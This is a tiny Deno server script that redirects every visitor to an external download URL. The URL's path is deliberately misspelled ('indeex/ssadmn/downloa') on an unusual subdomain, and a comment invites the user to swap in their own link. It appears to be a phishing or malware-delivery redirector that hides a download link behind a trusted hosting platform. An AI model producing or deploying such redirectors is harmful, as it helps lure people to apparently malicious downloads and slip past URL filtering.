import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://omnadoe.sa.com//indeex/ssadmn/downloa/", // Replace this with your actual link
    },
  });
});
